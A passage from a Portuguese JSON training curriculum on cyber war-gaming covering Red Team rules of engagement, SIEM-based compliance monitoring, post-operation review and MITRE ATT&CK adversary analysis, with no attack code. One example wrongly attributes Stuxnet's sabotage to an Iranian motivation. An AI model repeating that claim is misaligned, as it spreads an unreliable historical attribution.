                                  "title": "Revisar, Aprovar e Finalizar o Documento",
                                  "subSteps": [
                                    "Realizar auto-revisão usando checklist (clareza, completude, conformidade)",
                                    "Compartilhar draft com stakeholders simulados ou reais para feedback",
                                    "Coletar assinaturas digitais ou físicas no template",
                                    "Incorporar feedbacks e gerar versão final numerada",
                                    "Arquivar documento com controle de versão"
                                  ],
                                  "verification": "Documento final assinado por pelo menos 3 stakeholders simulados e versionado",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramenta de assinatura digital (DocuSign ou Adobe Sign)",
                                    "Lista de stakeholders"
                                  ],
                                  "tips": "Simule aprovações com colegas para prática realista",
                                  "learningObjective": "Garantir aprovação formal e conformidade em processos colaborativos",
                                  "commonMistakes": [
                                    "Ignorar feedbacks críticos",
                                    "Assinaturas incompletas",
                                    "Não versionar mudanças"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulando ataque a uma rede corporativa, o ROE define: alvos limitados a VMs de teste, técnicas como scanning e exploitation permitidas apenas das 9h às 17h, proibição de dados reais, com assinaturas do líder de segurança, legal e comando.",
                              "finalVerifications": [
                                "Documento possui todas seções obrigatórias (introdução, regras, assinaturas)",
                                "Regras adaptadas do Blue Team Handbook para visão ofensiva",
                                "Pelo menos 3 assinaturas de stakeholders coletadas",
                                "Versão final versionada e arquivada",
                                "Checklist de conformidade 100% atendido",
                                "Linguagem clara sem ambiguidades"
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão das regras (nota 1-10)",
                                "Abrangência de adaptações ofensivas (completa/parcial/insuficiente)",
                                "Qualidade do processo de aprovação (eficaz/ineficaz)",
                                "Conformidade com Blue Team Handbook (alta/média/baixa)",
                                "Praticidade e acionabilidade do template",
                                "Controle de riscos e exceções bem definidos"
                              ],
                              "crossCurricularConnections": [
                                "Direito e Compliance: Entendimento de leis cibernéticas e responsabilidades legais",
                                "Gerenciamento de Projetos: Planejamento e controle de escopo em operações",
                                "Comunicação: Redação técnica clara para stakeholders multidisciplinares",
                                "Ética Profissional: Equilíbrio entre simulação ofensiva e segurança",
                                "Liderança: Coordenação de aprovações e responsabilidades"
                              ],
                              "realWorldApplication": "Em operações de pentest ou jogos de guerra cibernéticos reais, o ROE aprovado protege legalmente a equipe ofensiva, define limites operacionais e evita incidentes, como em exercícios da NSA ou certificações OSCP."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.3.2",
                            "name": "Monitorar Conformidade Durante Operações",
                            "description": "Implementar mecanismos de logging e supervisão em tempo real para verificar adesão às ROE, usando ferramentas de SIEM para detecção de desvios.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Requisitos de Monitoramento Baseados nas ROE",
                                  "subSteps": [
                                    "Analisar as Regras de Engajamento (ROE) para identificar ações permitidas, proibidas e condicionais.",
                                    "Mapear pontos críticos de operação, como acessos a redes, execuções de payloads e comunicações.",
                                    "Definir eventos chave para logging, incluindo timestamps, usuários, IPs e ações realizadas.",
                                    "Estabelecer métricas de conformidade, como limites de tráfego ou tipos de alvos.",
                                    "Documentar os requisitos em um plano de monitoramento claro e compartilhável."
                                  ],
                                  "verification": "Plano de requisitos documentado e revisado pela equipe, com mapeamento completo das ROE.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação das ROE",
                                    "Ferramentas de diagramação (ex: Draw.io, Lucidchart)",
                                    "Planilha ou editor de texto"
                                  ],
                                  "tips": "Priorize eventos de alto risco e evite logging excessivo para não sobrecarregar o sistema.",
                                  "learningObjective": "Mapear com precisão os requisitos de conformidade derivados das ROE.",
                                  "commonMistakes": [
                                    "Ignorar nuances legais nas ROE",
                                    "Definir logs muito genéricos sem foco em desvios específicos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Mecanismos de Logging nos Sistemas Operacionais",
                                  "subSteps": [
                                    "Habilitar logging detalhado em ferramentas de operação (ex: Wireshark para rede, syslog para servidores).",
                                    "Configurar logs centralizados usando ferramentas como ELK Stack ou Fluentd.",
                                    "Definir níveis de log (info, warn, error) alinhados aos eventos de ROE.",
                                    "Testar captura de logs em ambiente controlado com ações simuladas.",
                                    "Garantir criptografia e retenção de logs por período definido."
                                  ],
                                  "verification": "Logs gerados e centralizados corretamente durante teste simulado de operação.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Servidor de teste",
                                    "Ferramentas de logging (syslog-ng, rsyslog)",
                                    "Ambiente virtual (VMware/VirtualBox)"
                                  ],
                                  "tips": "Use padrões de log estruturado (JSON) para facilitar parsing posterior no SIEM.",
                                  "learningObjective": "Implementar logging robusto e centralizado para supervisão em tempo real.",
                                  "commonMistakes": [
                                    "Não testar logs em cenários reais",
                                    "Esquecer de logs de rede ou aplicação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar e Configurar Ferramenta SIEM",
                                  "subSteps": [
                                    "Selecionar e instalar SIEM open-source (ex: ELK com Wazuh ou Splunk Free).",
                                    "Configurar ingestão de logs dos sistemas de operação para o SIEM.",
                                    "Criar dashboards iniciais para visualização em tempo real de métricas chave.",
                                    "Habilitar índices e parsing de logs para campos ROE-relevantes (ex: alvo, ação).",
                                    "Verificar conectividade e fluxo de dados em tempo real."
                                  ],
                                  "verification": "Dashboards do SIEM exibem logs em tempo real de fontes configuradas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "SIEM tool (ELK Stack, Splunk)",
                                    "Servidor dedicado ou nuvem (AWS/GCP)",
                                    "Documentação da ferramenta SIEM"
                                  ],
                                  "tips": "Comece com configurações mínimas e escale; monitore uso de recursos do SIEM.",
                                  "learningObjective": "Integrar fontes de log em SIEM para análise unificada.",
                                  "commonMistakes": [
                                    "Configurações erradas de parsing levando a dados ilegíveis",
                                    "Sobrecarga de dados sem filtros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Regras de Detecção de Desvios nas ROE",
                                  "subSteps": [
                                    "Criar regras de correlação no SIEM baseadas em violações ROE (ex: acesso a IP não autorizado).",
                                    "Configurar alertas em tempo real via email/Slack para desvios detectados.",
                                    "Definir thresholds e condições lógicas para falsos positivos mínimos.",
                                    "Testar regras com cenários de desvio e conformidade simulados.",
                                    "Documentar e versionar as regras criadas."
                                  ],
                                  "verification": "Alertas gerados corretamente em testes de desvio, sem falsos positivos em conformidade.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Interface do SIEM para regras",
                                    "Scripts de teste (Python/Bash)",
                                    "Cenários de teste ROE"
                                  ],
                                  "tips": "Use queries Sigma ou YARA para regras padronizadas e reutilizáveis.",
                                  "learningObjective": "Desenvolver detecções precisas para desvios de conformidade.",
                                  "commonMistakes": [
                                    "Regras muito rígidas gerando alertas excessivos",
                                    "Não considerar contexto temporal nas ROE"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar o Sistema Completo de Monitoramento",
                                  "subSteps": [
                                    "Executar simulação completa de operação cibernética com desvios intencionais.",
                                    "Verificar detecção, alertas e logs em tempo real.",
                                    "Analisar relatórios gerados e ajustar regras conforme necessário.",
                                    "Realizar auditoria de cobertura: todos pontos ROE monitorados?",
                                    "Treinar equipe na resposta a alertas e documentar procedimentos."
                                  ],
                                  "verification": "Relatório de teste confirma 100% de detecção de desvios com tempo de resposta <5min.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente de simulação (CTF-like)",
                                    "Ferramentas de ataque ético (Metasploit)",
                                    "Checklist de validação"
                                  ],
                                  "tips": "Registre métricas de performance (latência de alertas) para otimizações futuras.",
                                  "learningObjective": "Validar end-to-end o sistema de monitoramento de conformidade.",
                                  "commonMistakes": [
                                    "Testes superficiais sem desvios reais",
                                    "Ignorar validação em escala"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team/Blue Team, configure logging em ferramentas de ataque como Cobalt Strike e integre ao SIEM (ELK+Wazuh). Durante a simulação, detecte e alerte um desvio ROE quando o time tenta acessar um alvo civil simulado, pausando a operação via alerta em tempo real.",
                              "finalVerifications": [
                                "Todos eventos chave de operação são logados e visíveis no SIEM em <1min.",
                                "Regras detectam 100% dos desvios ROE em testes simulados.",
                                "Alertas são enviados em tempo real com detalhes acionáveis.",
                                "Dashboards fornecem supervisão clara sem sobrecarga visual.",
                                "Sistema resiste a falhas: logs persistem e SIEM recupera automaticamente.",
                                "Documentação cobre configuração, regras e procedimentos de resposta."
                              ],
                              "assessmentCriteria": [
                                "Precisão das regras de detecção (>95% sem falsos positivos).",
                                "Tempo de detecção e alerta (<2 minutos para desvios).",
                                "Cobertura completa dos pontos ROE mapeados.",
                                "Facilidade de uso dos dashboards para supervisão não técnica.",
                                "Robustez: sistema opera sem interrupções por 24h em teste.",
                                "Documentação clara e reprodutível por outro profissional."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Queries e visualizações em SIEM.",
                                "Redes e Sistemas: Configuração de logging em infra.",
                                "Direito e Ética: Interpretação de ROE e conformidade legal.",
                                "Gestão de Incidentes: Resposta a alertas detectados.",
                                "Desenvolvimento de Software: Scripts para automação de regras."
                              ],
                              "realWorldApplication": "Em operações cibernéticas militares ou corporativas, como defesa contra APTs, o monitoramento garante adesão a ROE internacionais, evitando escaladas legais ou éticas, como em ciberdefesas da OTAN ou simulações de CERTs nacionais."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.3.3",
                            "name": "Realizar Análise Pós-Operação de ROE",
                            "description": "Avaliar violações potenciais, gerar relatórios de conformidade e propor melhorias, integrando lições com montagem de ambientes de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coletar e Organizar Dados Pós-Operação",
                                  "subSteps": [
                                    "Reúna todos os logs de rede, gravações de sessões e relatórios de ferramentas de monitoramento usados durante a operação de ROE.",
                                    "Categorize os dados por fases da operação: preparação, execução e término.",
                                    "Documente timestamps, atores envolvidos e ações executadas em uma linha do tempo cronológica.",
                                    "Valide a integridade dos dados cruzando fontes múltiplas para evitar lacunas.",
                                    "Armazene os dados em um repositório seguro com backups."
                                  ],
                                  "verification": "Verifique se a linha do tempo está completa e sem inconsistências ao comparar com logs originais.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Logs de ferramentas como Wireshark, ELK Stack ou Splunk",
                                    "Planilhas ou ferramentas como Excel/Google Sheets",
                                    "Ambiente de armazenamento seguro (ex: drive criptografado)"
                                  ],
                                  "tips": "Use scripts automatizados para parsing de logs para agilizar a coleta.",
                                  "learningObjective": "Dominar a coleta sistemática de evidências pós-operacionais para análise precisa.",
                                  "commonMistakes": [
                                    "Ignorar dados de fontes secundárias",
                                    "Não validar integridade, levando a análises enviesadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Violações Potenciais de ROE",
                                  "subSteps": [
                                    "Revise as Regras de Engajamento (ROE) documentadas e compare com ações registradas na linha do tempo.",
                                    "Classifique ações como conformes, violações menores ou graves usando critérios pré-definidos.",
                                    "Analise impactos potenciais de cada violação em termos de risco legal, operacional e ético.",
                                    "Consulte stakeholders ou gravações para contextualizar ações ambíguas.",
                                    "Registre evidências específicas para cada violação identificada."
                                  ],
                                  "verification": "Crie um mapa de calor ou tabela resumindo violações com evidências anexadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Documento oficial de ROE",
                                    "Ferramentas de análise como mind maps (ex: XMind) ou tabelas em Markdown",
                                    "Gravações de sessões de operação"
                                  ],
                                  "tips": "Priorize violações por severidade para focar em issues críticas primeiro.",
                                  "learningObjective": "Desenvolver habilidade em detectar desvios de regras em cenários cibernéticos complexos.",
                                  "commonMistakes": [
                                    "Interpretação subjetiva sem evidências",
                                    "Sobrestimar conformidade sem revisão cruzada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar Relatório de Conformidade",
                                  "subSteps": [
                                    "Estruture o relatório com seções: introdução, linha do tempo, violações identificadas, análise de impactos e conclusões.",
                                    "Inclua visualizações como gráficos de violações e fluxogramas de ações.",
                                    "Redija recomendações preliminares baseadas em padrões de conformidade (ex: NIST, MITRE).",
                                    "Revise o relatório para clareza, precisão e linguagem neutra.",
                                    "Prepare versão executiva resumida para stakeholders."
                                  ],
                                  "verification": "Submeta o relatório a uma revisão por pares simulada e corrija feedbacks.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Templates de relatório (Word, LaTeX ou Google Docs)",
                                    "Ferramentas de visualização (Tableau, Draw.io)",
                                    "Guias de conformidade cibernética"
                                  ],
                                  "tips": "Use bullet points e tabelas para melhorar legibilidade.",
                                  "learningObjective": "Produzir relatórios profissionais que comuniquem conformidade de forma eficaz.",
                                  "commonMistakes": [
                                    "Relatórios prolixos sem resumo executivo",
                                    "Omissão de visualizações impactantes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Propor Melhorias e Integrar Lições Aprendidas",
                                  "subSteps": [
                                    "Analise violações para extrair lições aprendidas e padrões recorrentes.",
                                    "Proponha melhorias específicas para ROE, treinamento e ferramentas de monitoramento.",
                                    "Integre lições com montagem de ambientes de jogos cibernéticos futuros (ex: ajustes em cenários de simulação).",
                                    "Priorize ações corretivas por viabilidade e impacto.",
                                    "Documente um plano de ação com responsáveis e prazos."
                                  ],
                                  "verification": "Valide propostas simulando sua aplicação em um mini-cenário de jogo cibernético.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas de simulação cibernética (ex: Cyber Range, GNS3)",
                                    "Templates de plano de ação (Trello, Asana)"
                                  ],
                                  "tips": "Envolva perspectivas multidisciplinares para propostas robustas.",
                                  "learningObjective": "Transformar análises em ações preventivas integradas a treinamentos cibernéticos.",
                                  "commonMistakes": [
                                    "Propostas genéricas sem métricas de sucesso",
                                    "Falta de integração com ciclos de jogos cibernéticos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de jogo cibernético de defesa contra ransomware, identifique que uma ação de contra-ataque excedeu limites de ROE ao acessar redes civis; gere relatório destacando a violação, proponha treinamento em segmentação de redes e integre ao próximo ambiente de simulação com barreiras virtuais reforçadas.",
                              "finalVerifications": [
                                "Relatório cobre 100% das ações da operação com evidências.",
                                "Todas violações têm análise de impacto documentada.",
                                "Propostas de melhoria são acionáveis e mensuráveis.",
                                "Lições integradas validam-se em um teste de simulação rápida.",
                                "Relatório é aprovado em revisão simulada sem erros factuais.",
                                "Plano de ação inclui prazos e responsáveis claros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de violações (90%+ alinhamento com ROE).",
                                "Qualidade e completude do relatório (estrutura, visualizações e clareza).",
                                "Relevância e viabilidade das propostas de melhoria.",
                                "Integração efetiva com ambientes de jogos cibernéticos.",
                                "Profundidade da análise de lições aprendidas.",
                                "Tempo de conclusão dentro do estimado total (6-11 horas)."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de logs e visualizações para insights.",
                                "Gestão de Projetos: Criação de planos de ação com prazos.",
                                "Ética e Direito: Avaliação de impactos legais em ROE.",
                                "Engenharia de Software: Automatização de parsing de logs.",
                                "Simulações e Modelagem: Integração com cyber ranges."
                              ],
                              "realWorldApplication": "Em operações cibernéticas militares ou corporativas, como resposta a incidentes em redes críticas, essa análise garante conformidade legal, minimiza riscos futuros e melhora treinamentos em Red Team/Blue Team exercises, similar a práticas do USCYBERCOM."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.5",
                    "name": "Planejamento e Criação de Cenários de Ameaça",
                    "description": "Métodos para desenvolver e planejar simulações realistas de ameaças cibernéticas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.5.1",
                        "name": "Análise do Mindset do Adversário",
                        "description": "Compreensão das motivações, táticas e comportamentos típicos de adversários cibernéticos para fundamentar cenários realistas de ameaça.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.1.1",
                            "name": "Identificar táticas comuns de adversários",
                            "description": "Analisar frameworks como MITRE ATT&CK para mapear táticas, técnicas e procedimentos (TTPs) usados por threat actors reais, adaptando-os a simulações de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Familiarizar-se com o Framework MITRE ATT&CK",
                                  "subSteps": [
                                    "Acesse o site oficial do MITRE ATT&CK e explore a matriz de táticas.",
                                    "Estude a estrutura: táticas (o quê), técnicas (como) e procedimentos (como específico).",
                                    "Revise as categorias principais como Reconhecimento, Execução e Persistência.",
                                    "Anote definições chave de TTPs em um documento pessoal.",
                                    "Assista a um vídeo introdutório de 10-15 minutos sobre o framework."
                                  ],
                                  "verification": "Crie um mapa mental ou tabela resumindo as 14 táticas principais do MITRE ATT&CK.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Site MITRE ATT&CK (attack.mitre.org)",
                                    "Ferramenta de mapa mental como MindMeister ou papel/caneta",
                                    "Vídeo introdutório no YouTube (buscar 'MITRE ATT&CK Introduction')"
                                  ],
                                  "tips": "Comece pela visão geral da matriz para não se perder em detalhes iniciais.",
                                  "learningObjective": "Compreender a arquitetura e componentes do MITRE ATT&CK para análise de adversários.",
                                  "commonMistakes": [
                                    "Confundir táticas com técnicas; táticas são objetivos de alto nível.",
                                    "Ignorar exemplos reais listados em cada tática."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Táticas Comuns Usadas por Adversários",
                                  "subSteps": [
                                    "Liste as táticas mais frequentes (ex: Initial Access, Execution, Lateral Movement).",
                                    "Pesquise relatórios de threat intelligence para frequência de uso (ex: Verizon DBIR).",
                                    "Compare táticas entre grupos APT como APT28 e Lazarus.",
                                    "Crie uma tabela ranking as top 5 táticas por prevalência.",
                                    "Discuta em fórum ou com pares para validar percepções."
                                  ],
                                  "verification": "Produza uma lista priorizada de 5-7 táticas comuns com evidências de uso real.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Relatórios como Verizon DBIR, MITRE ATT&CK Navigator",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Use o ATT&CK Navigator para visualizar heatmaps de táticas usadas por grupos.",
                                  "learningObjective": "Reconhecer padrões recorrentes em ataques cibernéticos reais.",
                                  "commonMistakes": [
                                    "Focar apenas em táticas avançadas; priorize as básicas que representam 80% dos ataques.",
                                    "Não citar fontes de dados reais."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Threat Actors Reais e Seus TTPs",
                                  "subSteps": [
                                    "Selecione 3 threat actors (ex: APT29/Cozy Bear, Emotet, Ransomware groups).",
                                    "Mapeie seus TTPs no MITRE ATT&CK usando páginas de grupos.",
                                    "Identifique sobreposições e táticas únicas.",
                                    "Documente procedimentos específicos com exemplos de IOCs.",
                                    "Crie perfis resumidos para cada actor."
                                  ],
                                  "verification": "Gere relatórios curtos (1 página cada) para 3 threat actors com TTPs mapeados.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "MITRE ATT&CK Groups page",
                                    "Ferramentas como MISP ou planilhas para mapeamento"
                                  ],
                                  "tips": "Filtre por 'Groups' no ATT&CK Navigator para visualizações rápidas.",
                                  "learningObjective": "Mapear TTPs de adversários reais para padrões identificáveis.",
                                  "commonMistakes": [
                                    "Sobrecarregar com todos os TTPs; foque nos mais usados (top 10 por grupo).",
                                    "Ignorar evoluções recentes nos perfis."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adaptar TTPs para Simulações de Red Team",
                                  "subSteps": [
                                    "Escolha um cenário de simulação (ex: invasão corporativa).",
                                    "Adapte 3-5 TTPs reais para o cenário, ajustando procedimentos.",
                                    "Crie um plano de ataque passo a passo usando Atomic Red Team ou Caldera.",
                                    "Teste em ambiente lab (ex: VM com ferramentas de simulação).",
                                    "Registre ajustes necessários para realismo."
                                  ],
                                  "verification": "Desenvolva e execute um plano de simulação Red Team com TTPs adaptados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Atomic Red Team GitHub",
                                    "Ferramentas como Caldera ou VMs (VirtualBox)",
                                    "Ambiente lab isolado"
                                  ],
                                  "tips": "Use testes atômicos prontos do Atomic Red Team para validar TTPs.",
                                  "learningObjective": "Transformar análise de TTPs em ações simuladas de Red Team.",
                                  "commonMistakes": [
                                    "Adaptar sem considerar defesas azuis; inclua counters.",
                                    "Não isolar o lab para evitar impactos reais."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Revisar e Refinar Conhecimento",
                                  "subSteps": [
                                    "Revise todos os mapas e planos criados nos steps anteriores.",
                                    "Simule uma defesa contra suas próprias simulações.",
                                    "Atualize com novas entradas do MITRE ATT&CK.",
                                    "Crie flashcards para táticas chave.",
                                    "Ensine o conceito a um par para reforço."
                                  ],
                                  "verification": "Realize um quiz autoavaliado cobrindo 20 TTPs e cenários.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Flashcards app como Anki",
                                    "Quiz online (Kahoot ou Google Forms)"
                                  ],
                                  "tips": "Ensine para aprender: explique para um colega ou grave um vídeo curto.",
                                  "learningObjective": "Consolidar e aplicar o conhecimento de forma independente.",
                                  "commonMistakes": [
                                    "Pular revisão; sempre valide com dados atualizados.",
                                    "Não praticar ensino ativo."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação Red Team para uma empresa financeira, adapte TTPs do APT29: use 'Phishing: Spearphishing Attachment' (T1566.001) para Initial Access, seguido de 'Command and Scripting Interpreter: PowerShell' (T1059.001) para Execution, mapeando contra a matriz ATT&CK em um lab com VMs Windows.",
                              "finalVerifications": [
                                "Pode listar e explicar 10 táticas comuns do MITRE ATT&CK com exemplos.",
                                "Mapeia corretamente TTPs de pelo menos 2 threat actors reais.",
                                "Cria um plano Red Team viável adaptando 5 TTPs a um cenário dado.",
                                "Identifica erros em um plano de ataque fornecido.",
                                "Usa ATT&CK Navigator para visualizar e priorizar TTPs.",
                                "Explica adaptações necessárias para simulações realistas."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de TTPs (90%+ acurácia contra MITRE).",
                                "Profundidade de análise de threat actors (cobertura de táticas, técnicas e procedimentos).",
                                "Criatividade e viabilidade na adaptação para Red Team.",
                                "Uso correto de ferramentas e recursos (ex: Navigator, Atomic Red Team).",
                                "Capacidade de identificar e mitigar erros comuns.",
                                "Clareza na documentação e comunicação de planos."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de heatmaps e estatísticas para priorizar TTPs.",
                                "Psicologia: Entender mindset de adversários via padrões comportamentais.",
                                "Estratégia Militar: Paralelos com doutrinas de guerra (OODA Loop).",
                                "Programação/Scripting: Implementação de TTPs via PowerShell/Python.",
                                "Inteligência de Negócios: Threat intelligence como OSINT."
                              ],
                              "realWorldApplication": "Em equipes de SOC ou Red Team, identificar TTPs comuns permite priorizar defesas (ex: bloquear PowerShell em endpoints), simular ataques realistas para treinamentos e responder incidentes mapeando contra MITRE ATT&CK para aceleração de hunts."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.2",
                            "name": "Mapear motivações e objetivos adversários",
                            "description": "Estudar casos históricos de ataques cibernéticos para inferir objetivos como espionagem, sabotagem ou roubo de dados, integrando ao planejamento de cenários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar Casos Históricos de Ataques Cibernéticos",
                                  "subSteps": [
                                    "Identifique fontes confiáveis como relatórios do MITRE ATT&CK, CSIS Significant Cyber Incidents e relatórios da Mandiant.",
                                    "Selecione pelo menos 5 casos variados, como Stuxnet (2010), SolarWinds (2020), WannaCry (2017), NotPetya (2017) e Equifax breach (2017).",
                                    "Registre detalhes chave: alvo, método de intrusão, impacto e reivindicações públicas.",
                                    "Compile uma tabela com colunas para data, ator atribuído, tipo de ataque e consequências observadas.",
                                    "Anote evidências iniciais de motivações declaradas ou inferidas."
                                  ],
                                  "verification": "Tabela completa com 5+ casos documentados e fontes citadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Acesso à internet, MITRE ATT&CK framework, relatórios de cibersegurança (CSIS, FireEye), planilha (Google Sheets ou Excel).",
                                  "tips": "Priorize casos com atribuição confirmada para evitar especulações iniciais.",
                                  "learningObjective": "Coletar dados factuais de incidentes reais para basear análises futuras.",
                                  "commonMistakes": "Confundir correlação com causalidade ou usar fontes não verificadas como blogs anônimos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inferir Objetivos Primários dos Casos Estudados",
                                  "subSteps": [
                                    "Para cada caso, classifique objetivos potenciais: espionagem (ex: roubo de IP), sabotagem (ex: destruição de infra), roubo de dados (ex: credenciais financeiras).",
                                    "Analise evidências: payloads usados, dados exfiltrados, timing do ataque e comunicações do ator.",
                                    "Use frameworks como Diamond Model of Intrusion Analysis para mapear adversário, infraestrutura e vítima.",
                                    "Crie um diagrama de fluxo mostrando motivação → objetivo → tática para 2-3 casos.",
                                    "Compare inferências com declarações oficiais ou análises de experts."
                                  ],
                                  "verification": "Diagrama e classificação completos para todos os casos, com justificativas baseadas em evidências.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io, Lucidchart), Diamond Model PDF, notas do Step 1.",
                                  "tips": "Pergunte 'O que o atacante ganhou?' e 'O que a vítima perdeu?' para guiar inferências.",
                                  "learningObjective": "Desenvolver habilidade de deduzir intenções adversárias de padrões observados.",
                                  "commonMistakes": "Projetar motivações modernas em ataques antigos sem contexto histórico."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Categorizar Motivações e Objetivos Comuns",
                                  "subSteps": [
                                    "Agrupe objetivos em categorias: financeiras (ransomware), geopolíticas (espionagem estatal), ideológicas (hacktivismo), criminosas oportunistas.",
                                    "Identifique padrões recorrentes, como atores estatais focando em sabotagem persistente vs. criminosos em roubo rápido.",
                                    "Crie uma matriz de motivações x objetivos com exemplos de cada interseção.",
                                    "Avalie evolução temporal: como objetivos mudaram de 2000-2023 (ex: mais supply chain attacks).",
                                    "Priorize top 5 motivações mais relevantes para o seu contexto organizacional."
                                  ],
                                  "verification": "Matriz categorizada com pelo menos 4 categorias e 3 exemplos cada.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Planilha para matriz, notas dos Steps 1-2, timer para análise temporal.",
                                  "tips": "Use cores na matriz para visualizar frequência e severidade.",
                                  "learningObjective": "Sintetizar dados em categorias acionáveis para planejamento estratégico.",
                                  "commonMistakes": "Sobrecategorizar (manter <6 categorias principais) ou ignorar atores híbridos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Mapeamento ao Planejamento de Cenários de Ameaça",
                                  "subSteps": [
                                    "Selecione 2-3 cenários hipotéticos baseados em motivações mapeadas (ex: espionagem chinesa em tech firm).",
                                    "Mapeie TTPs (Tactics, Techniques, Procedures) prováveis usando MITRE ATT&CK Navigator.",
                                    "Desenvolva countermeasures específicas por objetivo inferido.",
                                    "Crie um relatório de 1-página com mapa de motivações integrado ao plano de cenários.",
                                    "Simule um walkthrough: 'Se motivação X, então cenário Y com mitigação Z'."
                                  ],
                                  "verification": "Relatório final com cenários integrados e simulação documentada.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "MITRE ATT&CK Navigator (online), template de relatório, notas anteriores.",
                                  "tips": "Teste cenários com 'what-if' para validar robustez.",
                                  "learningObjective": "Aplicar insights de mindset adversário diretamente em planejamento defensivo.",
                                  "commonMistakes": "Criar cenários genéricos sem ancorar em casos reais estudados."
                                }
                              ],
                              "practicalExample": "Analisando o Stuxnet: inferir sabotagem (motivação geopolítica iraniana) pelo payload que danificou centrífugas nucleares sem detecção inicial, integrando a um cenário de jogo de guerra simulando ataques a infra crítica brasileira.",
                              "finalVerifications": [
                                "Pode listar e justificar 5+ casos históricos com objetivos inferidos corretamente.",
                                "Matriz de motivações/objetivos cobre 80% dos casos estudados.",
                                "Cenários de ameaça incluem pelo menos 3 integrações diretas de mindsets adversários.",
                                "Relatório final identifica TTPs alinhados com motivações mapeadas.",
                                "Simulação walkthrough demonstra aplicação prática sem gaps lógicos.",
                                "Evidências de fontes citadas em todos os artefatos."
                              ],
                              "assessmentCriteria": [
                                "Profundidade da pesquisa: fontes variadas e análise baseada em fatos (30%).",
                                "Precisão das inferências: alinhamento com análises expert (25%).",
                                "Qualidade da categorização: matriz clara e abrangente (20%).",
                                "Integração efetiva: cenários acionáveis e realistas (15%).",
                                "Clareza e organização: diagramas, tabelas profissionais (10%)."
                              ],
                              "crossCurricularConnections": [
                                "História: Estudo de conflitos geopolíticos e guerra fria cibernética.",
                                "Psicologia: Análise de comportamentos motivacionais e decision-making sob risco.",
                                "Estratégia Militar: Conceitos de OODA Loop e inteligência de ameaças.",
                                "Análise de Dados: Uso de frameworks como Diamond Model para pattern recognition."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, mapear mindsets permite criar exercícios realistas de jogos de guerra cibernética; em threat hunting, priorizar hunts baseados em motivações ativas (ex: detectar exfiltração estatal vs. ransomware)."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.3",
                            "name": "Avaliar níveis de sofisticação de ameaças",
